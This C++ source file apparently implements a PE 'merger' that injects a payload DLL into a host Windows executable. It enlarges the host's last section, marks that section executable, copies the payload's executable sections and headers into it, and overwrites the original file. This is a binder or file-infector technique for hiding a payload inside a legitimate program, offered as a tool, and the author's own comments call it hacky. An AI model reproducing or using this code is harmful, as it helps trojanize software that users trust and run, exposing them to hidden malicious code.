#include "./merge.hpp"

#include <windows.h>
#include <winnt.h>
#include <fstream>

namespace merger
{

void merge( const std::string& host, const std::string& payload )
{
	// read the files into memory
	std::fstream fhost( host, std::ios::binary | std::ios::ate | std::ios::in | std::ios::out );
	std::fstream fpayload( payload, std::ios::binary | std::ios::ate | std::ios::in );

	const std::streamsize host_file_size = fhost.tellg();
	const std::streamsize payload_file_size = fpayload.tellg();

	const std::streamsize combined_size = host_file_size + payload_file_size; // plenty of room for writing

	fhost.seekg( 0, std::ios::beg );
	fpayload.seekg( 0, std::ios::beg );

	char* host_memory = static_cast<char*>(operator new(combined_size));
	char* payload_memory = static_cast<char*>(operator new(payload_file_size)); // i could write this into host_memory but this is easier so we just do this (files are tiny anyway)

	std::memset( host_memory, 0, combined_size );
	std::memset( payload_memory, 0, payload_file_size );

	fhost.read( host_memory, host_file_size );
	fpayload.read( payload_memory, payload_file_size );

	// get last pe section header of host (host is 32 bit so we need to be explicit about sizes)
	const auto host_dos_header = reinterpret_cast<IMAGE_DOS_HEADER*>(host_memory);
	const auto host_nt_headers = reinterpret_cast<IMAGE_NT_HEADERS32*>(host_memory + host_dos_header->e_lfanew);

	const IMAGE_FILE_HEADER* host_file_header = &(host_nt_headers->FileHeader);
	const IMAGE_OPTIONAL_HEADER32* host_optional_header = &(host_nt_headers->OptionalHeader);

	const auto host_last_section_header = reinterpret_cast<IMAGE_SECTION_HEADER*>(reinterpret_cast<char*>(const_cast<IMAGE_OPTIONAL_HEADER32*>(host_optional_header)) + host_file_header->SizeOfOptionalHeader) + host_file_header->NumberOfSections - 1;
	const char* host_address_of_payload = host_memory + host_last_section_header->PointerToRawData + host_last_section_header->SizeOfRawData;

	// change last section size
	const unsigned long file_alignment = host_optional_header->FileAlignment;

	host_last_section_header->Misc.VirtualSize = host_last_section_header->SizeOfRawData; // write old section size into .VirtualSize (looks fine...?)
	host_last_section_header->SizeOfRawData = (host_last_section_header->SizeOfRawData + static_cast<DWORD>(payload_file_size) + file_alignment - 1) & ~(file_alignment - 1);

	// mark section as executable
	host_last_section_header->Characteristics |= IMAGE_SCN_MEM_EXECUTE; // very hacky, probably shouldnt do this

	// write sections of payload dll into last section (payload dll is 64 bit...)
	const auto payload_dos_header = reinterpret_cast<IMAGE_DOS_HEADER*>(payload_memory);
	const auto payload_nt_headers = reinterpret_cast<IMAGE_NT_HEADERS64*>(payload_memory + payload_dos_header->e_lfanew);

	const IMAGE_FILE_HEADER* payload_file_header = &(payload_nt_headers->FileHeader);
	const IMAGE_OPTIONAL_HEADER64* payload_optional_header = &(payload_nt_headers->OptionalHeader);

	auto payload_current_section_header = reinterpret_cast<IMAGE_SECTION_HEADER*>(reinterpret_cast<char*>(const_cast<IMAGE_OPTIONAL_HEADER64*>(payload_optional_header)) + payload_file_header->SizeOfOptionalHeader);
	
	for ( int index = 0; index < payload_file_header->NumberOfSections; index++, payload_current_section_header++ )
	{
		// only write sections that we can execute
		if ( payload_current_section_header->Characteristics & IMAGE_SCN_MEM_EXECUTE )
		{
			std::memcpy( const_cast<char*>(host_address_of_payload) + payload_current_section_header->PointerToRawData, payload_memory + payload_current_section_header->PointerToRawData, payload_current_section_header->SizeOfRawData );
		}
	}

	// at this point, payload_current_section_header is at the last section, so we can get the size of the pe header and copy it
	const size_t size_of_pe_header = reinterpret_cast<char*>(payload_current_section_header) - payload_memory;

	std::memcpy( const_cast<char*>(host_address_of_payload), payload_memory, size_of_pe_header );

	// reset fhost cursor pos
	fhost.seekg( 0, std::ios::beg );

	// write the file back to the disk
	fhost.write( host_memory, combined_size );

	// close file handles
	fhost.close();
	fpayload.close();

	// free memory
	operator delete(host_memory);
	operator delete(payload_memory);
}

} // namespace merger